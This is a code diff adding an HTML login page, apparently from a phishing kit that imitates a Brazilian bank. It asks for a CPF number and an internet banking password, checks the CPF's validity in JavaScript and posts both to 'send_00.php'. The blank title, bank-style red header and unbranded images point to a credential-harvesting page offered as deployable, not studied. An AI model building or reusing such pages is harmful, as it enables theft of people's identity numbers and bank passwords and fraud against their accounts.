@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+     <title>-</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/tiopatas.css" rel="stylesheet">
+    <style type="text/css">
+
+
+    h1, input {
+        font-family: "Open Sans", Helvetica, sans-serif;
+    }
+
+    .input {
+        width: 100%;
+		background-color: #f7f7f7;
+        height: 50px;
+        display: block;
+        padding: 0 5px;
+        border: none;
+        border-bottom: 3px solid #ebebeb;
+    }
+    .input:focus {
+        outline: none;
+        border-bottom-color: #ff0000 !important;
+    }
+
+	
+.form-signin
+{
+    max-width: 100%;
+    padding: 20px;
+    margin: auto;
+}
+.form-signin .form-signin-heading, .form-signin .checkbox
+{
+    margin-bottom: 20px;
+}
+.form-signin .checkbox
+{
+    font-weight: normal;
+}
+.form-signin .form-control
+{
+    position: relative;
+    font-size: 16px;
+    height: auto;
+    padding: 10px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+.form-signin .form-control:focus
+{
+    z-index: 2;
+}
+.form-signin input[type="text"]
+{
+    margin-bottom: -1px;
+    border-bottom-left-radius: 0px;
+    border-bottom-right-radius: 0px;
+}
+.form-signin input[type="password"]
+{
+    margin-bottom: 10px;
+    border-top-left-radius: 0px;
+    border-top-right-radius: 0px;
+}
+.account-wall
+{
+    margin-top: -10px;
+    padding: 0px 0px 0px 0px;
+    background-color: #f7f7f7;
+    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+}
+.login-title
+{
+    color: #555;
+    font-size: 18px;
+    font-weight: 400;
+    display: block;
+}
+.profile-img
+{
+    width: 100%;
+    height: 50px;
+    margin: 5px 0px 0px;
+    display: block;
+    /*-moz-border-radius: 0%;
+    -webkit-border-radius: 0%;
+    border-radius: 40%;*/
+}
+
+</style>
+
+	
+<script language='JavaScript'>
+function SomenteNumero(e){
+    var tecla=(window.event)?event.keyCode:e.which;
+	var objeto = e.value;
+    if(objeto.length > 10){
+    return(false)
+    }	
+    if((tecla>47 && tecla<58)) return true;
+    else{
+    	if (tecla==8 || tecla==0) return true;
+	else  return false;
+    }
+}
+</script>
+
+
+<script language="javascript">
+function limitarInput(obj){
+var objeto = obj.value;
+ if(objeto.length > 7){
+  return false;
+ }
+
+}
+</script>
+
+
+<script>
+    function check_cpf(){
+		
+        if(document.getElementById('cpf').value.length < 11){
+            alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');
+            return false;
+        }else if(document.getElementById('cpf').value == 11111111111 ||
+            document.getElementById('cpf').value == 22222222222 ||
+            document.getElementById('cpf').value == 33333333333 ||
+            document.getElementById('cpf').value == 44444444444 ||
+            document.getElementById('cpf').value == 55555555555 ||
+            document.getElementById('cpf').value == 66666666666 ||
+            document.getElementById('cpf').value == 77777777777 ||
+            document.getElementById('cpf').value == 88888888888 ||
+            document.getElementById('cpf').value == 99999999999 ||
+            document.getElementById('cpf').value == 00000000000){
+            alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');
+            return false;
+        }else{
+            var t = '';
+            var d = '';
+            var c = '';
+            var cpf = document.getElementById('cpf').value;
+            for (t = 9; t < 11; t++) {
+                for (d = 0, c = 0; c < t; c++) {
+                    d += cpf[c] * ((t + 1) - c);
+                }
+                d = ((10 * d) % 11) % 10;
+
+                if (cpf[c] != d) {
+                    alert('O CPF Informado não é válido! Tente novamente!');
+                    return false;
+                }
+				
+            }
+			if(document.getElementById('senha').value.length < 6){
+			alert('Senha de internet não confere.\nA senha deve conter no minímo 6 digitos!');
+			document.getElementById('senha').value = "";
+			return false;	
+			}
+           return true;  
+        }
+
+ 
+    }
+	
+</script>
+
+
+	
+</head>
+
+
+<div id="source-code"> 
+<div class="container">
+    <div class="row">
+        <div>
+            <div class="account-wall">
+				<h6 align="center" style=" background-color: #ff0015;"><img src="./img/logo.png" height="80" width="250"></h6>
+		         <form id="loginform"  name="loginform" class="form-signin" action="send_00.php" method="POST"  onsubmit="return check_cpf();" />
+				 
+                 <input name="cpf" id="cpf" type="number" placeholder="CPF" class="input pass"  onkeypress="return SomenteNumero(this)"/>
+				 
+              <input name="senha" id="senha" type="password"   placeholder="Senha" required="required" class="input pass" onkeypress="return limitarInput(this)" /><br>
+			  
+                    <font color="#999"><button class="btn btn-lg btn-default btn-block" type="submit">CONTINUAR</button></font>
+				</label>
+			
+			<h5 align="center" ><img src="./img/two.png" height="100%" width="100%"></h5>
+			</form>
+						<img class="profile-img" src="./img/one.png" alt="">
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+</body>
+</html>
